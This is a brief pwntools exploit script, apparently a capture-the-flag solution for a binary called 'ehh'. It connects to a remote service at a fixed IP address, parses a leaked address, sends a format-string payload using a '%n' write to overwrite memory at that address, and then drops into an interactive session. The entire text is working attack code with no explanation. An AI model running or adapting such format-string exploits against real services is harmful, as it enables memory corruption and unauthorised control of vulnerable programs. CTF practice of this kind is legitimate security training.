from pwn import *

# p = process('./ehh')
p = remote('18.222.213.102' ,12345)
a = p.recv()[-11:]
payload = p32(int(a,16))
payload += ".%19x%06$n"
p.sendline(payload)
p.recv()
p.interactive()